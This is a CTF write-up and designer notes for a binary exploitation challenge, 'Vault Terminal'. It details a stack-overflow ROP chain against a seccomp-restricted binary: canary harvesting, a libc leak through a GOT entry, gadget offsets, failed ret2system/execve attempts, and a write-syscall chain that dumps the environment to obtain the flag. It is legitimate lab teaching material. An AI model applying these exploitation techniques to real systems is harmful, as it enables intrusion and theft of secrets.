# PWN#001 — Vault Terminal

**Objective (verbatim):** *"Get a shell on the remote host and read the flag."*
**Deliverables:** `vault` (ELF x86-64), `libc.so.6` (Debian GLIBC 2.42-13), `ld-linux-x86-64.so.2`.
**Flag:** `CTF{ee6c8e12d8a68dcd220ebe010e2cfa4b}` — **found in the process environment
variable `FLAG=`**, not in a file.

### 0. TL;DR of the real lesson

The brief says "get a shell". **`execve` and `openat` are blocked by seccomp** (SIGSYS — the
process is killed instantly; a control `write` placed right after the forbidden syscall is
never executed), while **`read` / `write` / `getpid` are allowed**. So there is no shell and
no `open("/flag")`. The win is a **memory-disclosure oracle**: `write(1, addr, n)` dumps any
mapped address to the socket, and the flag lives in the environment block on the stack.

> If `openat`/`execve` die but `read`/`write` live → stop chasing a shell. Dump `environ`.

### 1. Binary recon

Local `vault` (16 096 B, not stripped, ELF x86-64):
- Mitigations: **Full RELRO, Canary, NX, No PIE**.
- `main = 0x4012d1`, `vuln = 0x401220`.
- `vuln`: buffer at `rbp-0x50`, canary at `rbp-8`; **first `read` = 0x49 (73) bytes** (the
  "name"), **second `read` = 0x100 (256) bytes** (the "message"). Classic two-stage stack BOF.
- `puts@plt = 0x401030` (local), banner `=== Vault Terminal ===` @ `0x402061`.

⚠️ **The remote binary ≠ the provided binary.** The remote PLT/`.rodata` are shifted by
`+0x10` (and `.rodata` is moved). Only the **libc is identical** to the provided one.
The remote addresses that matter (fingerprinted):
- `G = 0x4012e0` = `pop rax ; xchg rdi, rax ; ret`
- `puts@plt = 0x401040` (appends `\n`)
- `read@plt = 0x401070`
- `LOOP = 0x4013c4` = re-entry to `vuln` **without** re-printing the banner

### 2. Leaking libc base

`0x403fc8` (remote) is **`__stack_chk_fail@GOT`**, not `read@GOT` — verified by leaking it and
`puts()`-ing the resolved pointer: it prints `48 85 ff 74 0b e9 46 fb ff ff`, the exact
`system` prologue (`test rdi,rdi; je; jmp swapcontext+0x110`). Therefore:

```
libc_base = leak(0x403fc8) - 0x1202b0     # __stack_chk_fail offset in the provided libc
```

Sanity check that must hold before doing anything else: **`puts(libc_base)` prints
`\x7fELF\x02\x01\x01\x03`** (e_ident + EI_ABIVERSION=3). If it doesn't, the base is wrong.

Stage-1 payload (name read, 73 bytes):
```
[72×'B'][canary(8)][saved rbp(8)][G][__stack_chk_fail@GOT=0x403fc8][puts@plt=0x401040][LOOP]
```
- `G` does `pop rax ← 0x403fc8` then `xchg rdi,rax` → `rdi = &__stack_chk_fail@GOT`, then `puts`.
- `puts` stops at the NUL of the canary's first byte → we read **7 bytes** of the GOT entry
  (`len(tail) >= 7`, take first 7, parse 6 useful bytes low-endian; memset canary starts `\x00`).
- Return to `LOOP` for a clean second cycle.

**Canary harvest:** send 73 `A`, read until `Leave a message for the vault keeper: `; the
canary follows the echoed name. Retry if a byte is `\n`/`\x00` (up to ~20 attempts).

### 3. Remote gadgets — the offsets that matter

Provided libc (byte-verified, and `pf=0x0 == vaddr` in `.text`):

| gadget | offset | note |
|--------|--------|------|
| `pop rdi ; ret` | `0x2a9b7` | works |
| `pop rsi ; ret` | `0x2a404` | **use this** |
| ~~`pop rsi ; ret`~~ | ~~`0x29e29`~~ | `41 5e` mis-aligned — **crashes** |
| `pop rdx ; ret` | `0x96372` | **use this** |
| ~~`pop rdx ; ret`~~ | ~~`0x8e06`~~ | `5a c3` but in a bad region — **crashes** |
| `pop rax ; ret` | `0x44386` | works |
| `syscall ; ret` | `0x926e2` | works |
| `ret` | `0x2846b` | alignment |
| `xchg eax, edi ; ret` | `0x17d1f6` | rax→rdi (32-bit, truncates) |

Other offsets (verified): `puts=0x82060`, `system=0x54790`, `/bin/sh=0x1aaea4`,
`dup2=0x102bd0`, `execve=0xe1090`, `environ=0x1eee28`, `__stack_chk_fail=0x1202b0`,
`read=0x1072b0`, `getenv=0x43dc0`.

> **Golden rule learned the hard way:** a `pop X ; ret` that disassembles cleanly can still
> crash (bad libc region / mis-aligned REX prefix). **Test every gadget in isolation:**
> `[gadget][junk][pop_rdi][known_str][puts][LOOP]` — if the known string prints, the gadget
> works. This is what unblocked the whole challenge.

### 4. The dead ends (and why they are dead)

Everything below **fails** — documenting so no one repeats the hours:
- `ret2system("/bin/sh")` → nothing; socket closes. `system("sleep 3")` measures 0.0–0.2 s
  (crash, no execution). Alignment (`ret` before `system`) tested both ways — no.
- `execve("/bin/sh",0,0)` via raw syscall → no shell.
- `dup2(fd,0/1/2)` for fd∈{3..6} then `execve` → no shell.
- `read@plt` brute-force scan `0x401040..0x401160` → all empty **until** the real one
  `0x401070` was found (after fixing `pop rsi`/`pop rdx`).
- `openat(AT_FDCWD, path, 0)` then read → **SIGSYS** (proven: a control `write` after it never
  runs). `execve` likewise. → **seccomp whitelist `read`/`write`/`getpid`**.

### 5. The working exploit (full chain)

All in a **single** second-cycle payload (multi-stage `read` + consecutive `write` syscalls
do work; the earlier crashes were the broken `pop rsi`/`pop rdx`, not the concept).

```
# cycle 1 : leak libc
name(73)  = 72*'B' + canary + rbp + p64(G) + p64(0x403fc8) + p64(0x401040) + p64(LOOP)
            -> parse 7 bytes -> libc_base = leak - 0x1202b0
            -> assert puts(libc_base) == b"\x7fELF\x02\x01\x01\x03"

# cycle 2 : dump environ
name(73)  = 72*'M' + canary + 8*'K'
payload   = p64(pop_rdi) + p64(libc_base + 0x1eee28) + p64(puts@plt) + p64(LOOP)   # puts(environ)
            -> envptr = unmangled 6 bytes (stack pointer, e.g. 0x7ffd...)

# cycle 3 : walk the environ pointer table
name(73)  = 72*'Z' + canary + 8*'K'
payload   = p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(envptr)
          + p64(pop_rdx) + p64(512)
          + p64(pop_rax) + p64(1) + p64(syscall) + p64(LOOP)      # write(1, envptr, 512)
            -> table of QWORD pointers (0x7f.. / 0x7ffd..)
            -> for each qword ptr :
                 write(1, ptr, 160) -> "KEY=VALUE"
```

Result (excerpt of the dump):

### 6. Why it's a good challenge (designer notes)

- The title/objective (**"get a shell"**) is a **deliberate misdirection**: seccomp makes the
  shell impossible, so the player must recognise that a **read/write oracle is enough** and
  turn to memory disclosure. This teaches the modern-CTF reality that `system`/`execve` are
  often denied and "flag = file" is an assumption.
- Putting the flag in **the environment** (injected via socat/docker `FLAG=...`) makes the
  `environ` dump the natural solve and rewards understanding of `__libc_start_main`'s stack
  layout (argc/argv/envp/auxv).
- Shipping **libc + ld** but *not* the matching main binary (remote is recompiled/shifted)
  forces real **remote fingerprinting** (GOT-slot identification by leak content, PLT scan)
  instead of "plug offsets and go".

### 7. Pitfalls players hit (anti-frustration tuning)

- **Trusting the provided binary's addresses** for the remote (offset +0x10 shift) — leak and
  fingerprint the remote instead.
- **Assuming a `pop X ; ret` from a generic gadget dump is safe** — several crash in this libc.
  Test each in isolation.
- **Two reads must be synchronised**: send the 73-byte name first, wait for the
  `Leave a message for the vault keeper: ` prompt, *then* send the 256-byte message payload.
  Otherwise the payload is swallowed by the 73-byte read.
- **Canary byte `\n`** truncates the leak → re-roll the connection.
- **Chasing the shell too long**: once `openat`/`execve` are proven SIGSYS, pivot to `environ`.
- `puts` **appends `\n`** and stops at NUL → always parse exact lengths, never "recv until
  timeout", on a persistent stage stream.

## Reusable tooling notes (from this session)

- Python **stdlib only**: `socket` + `struct`. A tiny `ru(sock, marker)` helper that reads
  until a prompt (with timeout) is all the protocol client you need.
- **Base sanity gate**: `puts(candidate_base) == b"\x7fELF\x02\x01\x01\x03"`. Cheap, decisive.
- **Gadget isolation test** before building a chain — saves hours.
- **seccomp probe**: `forbidden_syscall ; write(1, marker, n)`. If the marker never appears,
  the syscall is blocked (SIGSYS). Enumerate the allow-list with `read`/`write`/`getpid`.
- **Memory disclosure without `open`**: `write(1, addr, n)` on a known stack pointer
  (`environ`) → whole environment, `FLAG=` included. Also works to dump `.bss`/heap.
- Full resolved offsets + byte-exact chain are recorded above; the runnable solver is
  `exploit_final.py`.
